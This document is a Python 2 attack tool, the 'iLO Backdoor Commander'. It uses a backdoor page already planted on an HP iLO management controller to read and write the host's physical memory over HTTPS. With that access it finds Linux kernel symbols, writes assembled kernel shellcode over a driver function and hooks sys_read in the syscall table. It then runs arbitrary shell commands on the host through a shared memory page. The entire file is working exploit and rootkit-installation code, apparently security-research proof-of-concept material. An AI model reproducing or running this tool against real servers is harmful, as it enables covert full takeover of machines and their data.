#!/usr/bin/python

import sys
import requests
from struct import pack, unpack_from
from keystone import *
import code
import time

if len(sys.argv) < 2:
    print "[-] usage: %s remote_addr" % sys.argv[0]
    sys.exit(1)

class iLOBackdoorCommander:
    def __init__(self, ilo_url):
	self.ilo_url = ilo_url
	self.symbols = {}
	self.kbase = 0xffffffff81000000
	self.pkbase = 0x1000000
	self.kdata = None
	self.temp_file = "/tmp/ilo_bd_tmp"
	self.backdoor_status = 0
	self.shared_page = None
	self.shared_page_addr = None
	self.detect_backdoor()

    def help(self):
	print """
==============================================================================

Welcome to the iLO Backdoor Commander.

\tdetect_backdoor(): checks for the backdoor presence on iLO and the Linux host
\tinstall_linux_backdoor(): installs the Linux kernel backdoor if not present
\tcmd(CMD): executes a Linux shell command
\tremove_linux_backdoor(): removes the backdoor

Example:
\tib.detect_backdoor()
\tib.install_linux_backdoor()
\tib.cmd("/usr/bin/id")
\tib.remove_linux_backdoor()

==============================================================================

"""
	 
    def p64(self, x):
	return pack("<Q",x)

    def u64(self, x):
	return unpack_from("<Q",x)[0]

    def u32(self, x):
	return unpack_from("<L",x)[0]
    
    def get_xml_version(self):
	xml_url = "%s/xmldata?item=all" % self.ilo_url
	try:
	    r = requests.get(xml_url, verify=False)
	except:
	    print "[-] Connection error"
	    sys.exit(1)
	if r.status_code != 200:
	    return ""
    
	self.ilo_version = r.content.split("FWRI")[1][1:-2]

	print "[*] Found iLO version %s" % self.ilo_version
	return self.ilo_version
	
    def dump_memory(self, addr, count):
	asked_count = count
	addr_hi = addr>>32
	if addr_hi > 0x7fffffff:
	    addr_hi -= 0x100000000
	addr_lo = addr & 0xffffffff
	if addr_lo > 0x7fffffff:
	    addr_lo -= 0x100000000

	if (count % 0x10000) != 0:
	    count = count + (0x10000 - (count % 0x10000))
	    
	dump_url = "%s?act=dmp&hiaddr=%x&loaddr=%x&count=%x" % (self.backdoor_url, addr_hi, addr_lo, count)

	r = requests.get(dump_url, verify=False)
	if r.status_code != 200:
	    print "[-] Dump failed"
	    if len(r.content) > 0:
		print "\t%s" % r.content
	    sys.exit(1)

	return r.content[:asked_count]

    def write_memory_128(self, addr, data):
	addr_hi = addr>>32
	if addr_hi > 0x7fffffff:
	    addr_hi -= 0x100000000
	addr_lo = addr & 0xffffffff
	if addr_lo > 0x7fffffff:
	    addr_lo -= 0x100000000
	write_url = "%s?act=wmem&hiaddr=%x&loaddr=%x&data=%s" % (self.backdoor_url, addr_hi, addr_lo, data.encode("base64").replace("\n","").replace("+","%2B"))

	r = requests.get(write_url, verify=False)
	if r.status_code != 200:
	    print "[-] Dump failed"
	    if len(r.content) > 0:
		print "\t%s" % r.content
		sys.exit(1)

	return r.content

    def write_memory(self, addr, data):
	wdata = ""
	for x in xrange(0, len(data), 0x80):
	    wdata += self.write_memory_128(addr+x, data[x:x+0x80])
	return wdata

    def resolve_func(self, func):
	off = self.kdata.find(func + "\0")
	off_abs = 0
	ptr = 0
	while off != -1:
	    vaddr = self.kbase + off_abs + off
	    off2 = self.kdata.find(self.p64(vaddr))
	    if off2 != -1:
		ptr = self.u64(self.kdata[off2-8:])
		print "[+] Found %s @0x%x" % (func,ptr)
		return ptr
	    off_abs += off + 1
	    off = self.kdata[off_abs:].find(func + "\0")
	return ptr

    def add_symbol(self, sym_name, sym_addr):
	self.symbols[sym_name] = {}
	self.symbols[sym_name]["vaddr"] = sym_addr
	self.symbols[sym_name]["paddr"] = sym_addr - self.kbase + self.pkbase

    def get_symbol(self, sym_name):
	try:
	    sym_addr = self.resolve_func(sym_name)
	    self.add_symbol(sym_name, sym_addr)
	except:
	    print "[-] Fail resolving symbol %s" % sym_name
	    sys.exit(1)
	
    def get_kernel_symbols(self):
	off=0
	sys_call_table = 0
	while off != -1:
	    off = self.kdata[off:].find("89d1ff14c5".decode("hex"))
	    if off == -1:
		break
	    if self.kdata[off+9:off+11] == "\x48\x89":
		sys_call_table = self.u32(self.kdata[off+5:]) & 0xffffff
		break

	sys_call_table_virt = sys_call_table + self.kbase
	print "[+] Found syscall table @0x%x" % (sys_call_table_virt)
	self.add_symbol("sys_call_table", sys_call_table_virt)

	sys_read_ptr = self.u64(self.kdata[sys_call_table:])
	print "[+] Found sys_read @0x%x" % sys_read_ptr
	self.add_symbol("sys_read", sys_read_ptr)

	self.get_symbol("call_usermodehelper")
	self.get_symbol("serial8250_do_pm")
	self.get_symbol("kthread_create_on_node")
	self.get_symbol("wake_up_process")
	self.get_symbol("__kmalloc")
	self.get_symbol("slow_virt_to_phys")
	self.get_symbol("msleep")
	self.get_symbol("strcat")
	self.get_symbol("kernel_read_file_from_path")
	self.get_symbol("vfree")

    def asm_kshellcode(self):
	with open("linux_backdoor.S", "rb") as f:
	    sc = f.read() % (self.symbols["sys_call_table"]["vaddr"], self.symbols["sys_read"]["vaddr"], self.symbols["kthread_create_on_node"]["vaddr"], self.symbols["wake_up_process"]["vaddr"], self.symbols["__kmalloc"]["vaddr"], self.symbols["slow_virt_to_phys"]["vaddr"], self.symbols["msleep"]["vaddr"], self.symbols["kernel_read_file_from_path"]["vaddr"], self.symbols["vfree"]["vaddr"], self.symbols["call_usermodehelper"]["vaddr"], self.symbols["strcat"]["vaddr"])
	with open("/tmp/ilosc.S","wb") as f:
	    f.write(sc)
	ks = Ks(KS_ARCH_X86, KS_MODE_64)
	ks.syntax = KS_OPT_SYNTAX_NASM
	return ''.join(chr(x) for x in ks.asm(sc)[0])

    def detect_backdoor(self):
	self.backdoor_url = "%s/backd00r.htm" % self.ilo_url
	r = requests.get(self.backdoor_url, verify=False)
	if r.status_code != 400:
	    print "[-] iLO Backdoor not detected"
	else:
	    print "[+] iLO Backdoor found"
	    self.backdoor_status = 1
	    data = self.dump_memory(self.pkbase, 0xc)
	    if data[:3] == 'ILO':
		print "[+] Linux Backdoor found"
		self.shared_page_addr = self.u64(data[4:])
		self.backdoor_status = 2
	    else:
		print "[-] Linux Backdoor not detected"
    
    def install_linux_backdoor(self):
	if self.backdoor_status == 0:
	    print "[-] Missing iLO Backdoor..."
	    return
	elif self.backdoor_status == 2:
	    print "[*] Linux kernel backdoor already in place"
	    return
	if self.kdata is None:
	    print "[*] Dumping kernel..."
	    dump_count = 0x1000000

	    self.kdata = self.dump_memory(self.pkbase, dump_count)
	    with open("/tmp/kdata.bin","wb") as f:
		f.write(self.kdata)
	    #self.kdata = open("/tmp/kdata.bin","rb").read()

	    print "[+] Dumped %x bytes!" % len(self.kdata)

	self.get_kernel_symbols()
	self.kshellcode = self.asm_kshellcode()
	self.kshellcode += "%s\0" % self.temp_file

	wdata = self.write_memory(self.symbols["serial8250_do_pm"]["paddr"], self.kshellcode)
	
	if wdata != self.kshellcode:
	    print "[-] Data mismatch (1)"

	to_write = self.p64(self.symbols["serial8250_do_pm"]["vaddr"])
	wdata = self.write_memory(self.symbols["sys_call_table"]["paddr"], to_write)

	if wdata != to_write:
	    print "[-] Data mismatch (2)"

	print "[+] Shellcode written"

	self.write_memory(self.pkbase, "ILO " + self.p64(self.symbols["serial8250_do_pm"]["paddr"] + 2))
	self.detect_backdoor()

    def setup_channel(self):
	if self.shared_page_addr is None:
	    print "[-] Don't know where to read shared page address..."
	    return
	data = self.dump_memory(self.shared_page_addr, 16)
	ppage, vpage = unpack_from("<2Q", data)
	if ppage != 0x4141414141414141:
	    print "[+] Found shared memory page! 0x%x / 0x%x" % (ppage, vpage)
	    self.shared_page = ppage
	
    def cmd(self, my_cmd):
	if self.backdoor_status != 2:
	    print "[-] Linux kernel backdoor required"
	    return

	if self.shared_page is None:
	    self.setup_channel()

	if self.shared_page is None:
	    print "[-] Communication channel is down"
	    return

	self.write_memory(self.shared_page + 0x10, my_cmd + "\x00")
	self.write_memory(self.shared_page + 0x8, self.p64(len(my_cmd)))
	self.write_memory(self.shared_page, self.p64(1))

	# Wait 5sec for command output
	timer1 = int(time.time())
	timer2 = timer1

	while (timer2 - timer1) < 5:
	    data = self.dump_memory(self.shared_page + 0x1010, 0x10)
	    available_output, output_len = unpack_from("<2Q", data)
	    if available_output == 1:
		break
	    timer2 = int(time.time())

	if available_output != 1:
	    print "[-] Command timed out..."
	    return

	command_output = self.dump_memory(self.shared_page + 0x1020, output_len)

	self.write_memory(self.shared_page + 0x1010, self.p64(0) + self.p64(0))

	print command_output
	

    def remove_linux_backdoor(self):
	if self.backdoor_status != 2:
	    print "[-] Linux kernel backdoor required"
	    return

	if self.shared_page is None:
	    self.setup_channel()

	if self.shared_page is None:
	    print "[-] Communication channel is down"
	    return

	self.write_memory(self.shared_page, self.p64(0xdead))
	self.write_memory(self.pkbase, "\x7fELF")
	self.backdoor_status = 1
	self.shared_page = None

requests.packages.urllib3.disable_warnings()
ilo_url = "https://%s" % sys.argv[1]

ib = iLOBackdoorCommander(ilo_url)

ib.help()
code.interact(local=locals())

